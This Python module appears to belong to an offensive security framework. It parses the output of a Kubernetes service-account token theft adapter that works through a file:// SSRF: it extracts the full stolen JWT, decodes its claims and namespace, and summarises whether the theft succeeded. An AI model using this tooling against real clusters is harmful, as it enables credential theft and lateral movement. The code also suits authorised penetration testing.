"""
Pure parsing logic for k8s_sa_token_theft results.
Normalizes extracted Kubernetes service account JWT token and namespace,
decoding non-sensitive JWT claims (iss, sub, aud) without verifying signature.
No network calls or I/O.
"""
from __future__ import annotations

import base64
import json
import re
from typing import Any, Dict, List, Optional

from tradecraft.adapters.k8s_sa_token_theft.execute import (
    HttpExchange,
    RawK8sSaTokenResult,
)

# JWT format: header.payload.signature
_JWT_RE = re.compile(r"^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$")


def _decode_jwt_payload(token: str) -> Optional[Dict[str, Any]]:
    """Decodes JWT payload without verifying signature."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None

    payload_b64 = parts[1]
    # Add padding if needed
    rem = len(payload_b64) % 4
    if rem > 0:
        payload_b64 += "=" * (4 - rem)

    try:
        decoded_bytes = base64.urlsafe_b64decode(payload_b64.encode("ascii"))
        data = json.loads(decoded_bytes.decode("utf-8", errors="replace"))
        if isinstance(data, dict):
            return data
    except Exception:
        return None
    return None


def _serialize_exchange(ex: HttpExchange) -> Dict[str, Any]:
    return {
        "step": ex.step,
        "target_url": ex.target_url,
        "injected_url": ex.injected_url,
        "status_code": ex.status_code,
        "response_snippet": ex.response_text[:300] if ex.response_text else "",
        "error": ex.error,
    }


def parse(raw: RawK8sSaTokenResult) -> Dict[str, Any]:
    """Parse raw execution results into a clean, normalized dictionary."""
    output: Dict[str, Any] = {
        "target": raw.target,
        "inject_location": raw.inject_location,
        "token_obtained": False,
        "token": "",
        "namespace": "",
        "claims": {},
        "summary": "",
        "exchanges": [_serialize_exchange(ex) for ex in raw.exchanges],
        "error": raw.error,
    }

    if raw.error:
        output["summary"] = f"Execution halted with error: {raw.error}"
        return output

    raw_token = raw.raw_token_text.strip()

    # If token text was recovered, extract and validate
    if raw_token:
        # If response was wrapped in HTML/JSON, try to find a JWT substring
        match = _JWT_RE.search(raw_token)
        clean_token = match.group(0) if match else ""
        if not clean_token and raw_token.count(".") == 2 and not any(c in raw_token for c in (" ", "<", "\n", "\r")):
            clean_token = raw_token

        if clean_token:
            output["token_obtained"] = True
            output["token"] = clean_token

            # Clean namespace if present
            ns = raw.raw_namespace_text.strip()
            if ns and not any(c in ns for c in (" ", "<", "\n", "\r", "{")):
                output["namespace"] = ns

            claims = _decode_jwt_payload(clean_token)
            if claims:
                # Extract informative k8s claims
                safe_claims: Dict[str, Any] = {}
                for k in ("iss", "sub", "aud", "exp", "nbf", "iat"):
                    if k in claims:
                        safe_claims[k] = claims[k]

                # Extract k8s-specific metadata if present under kubernetes.io
                k8s_meta = claims.get("kubernetes.io", {})
                if isinstance(k8s_meta, dict):
                    safe_claims["kubernetes.io"] = k8s_meta
                    if not output["namespace"] and k8s_meta.get("namespace"):
                        output["namespace"] = k8s_meta["namespace"]

                output["claims"] = safe_claims

            ns_desc = f" in namespace '{output['namespace']}'" if output["namespace"] else ""
            sub_desc = f" for '{output['claims'].get('sub')}'" if output["claims"].get("sub") else ""
            output["summary"] = (
                f"Successfully extracted Kubernetes service account token{sub_desc}{ns_desc} via file:// SSRF"
            )
            return output

    # Diagnostics if token was not obtained
    if raw.exchanges:
        first_ex = raw.exchanges[0]
        if first_ex.error:
            output["summary"] = f"SSRF request failed: {first_ex.error}"
        elif first_ex.status_code == 404:
            output["summary"] = (
                "Target returned 404 on file:// request (path not found or file scheme not supported)"
            )
        elif first_ex.status_code in (400, 403):
            output["summary"] = (
                f"Target returned HTTP {first_ex.status_code} on file:// request "
                "(URL scheme or local file access blocked)"
            )
        else:
            code_desc = f"status {first_ex.status_code}" if first_ex.status_code else "no response"
            output["summary"] = f"SSRF query failed to return a valid service account token ({code_desc})"
    else:
        output["summary"] = "No HTTP exchanges took place"

    return output
